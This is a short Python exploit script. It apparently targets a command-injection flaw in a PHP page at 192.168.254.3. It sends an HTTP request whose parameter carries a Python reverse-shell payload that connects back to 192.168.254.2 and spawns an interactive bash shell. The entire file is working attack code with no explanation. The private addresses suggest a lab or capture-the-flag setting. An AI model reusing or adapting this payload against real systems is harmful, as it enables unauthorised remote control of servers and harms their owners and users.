import requests, sys
payload = '/usr/bin/python3.6 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.254.2",' + sys.argv[1] + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
r = requests.get("http://192.168.254.3/index.php?a="+payload)
print(r.text)
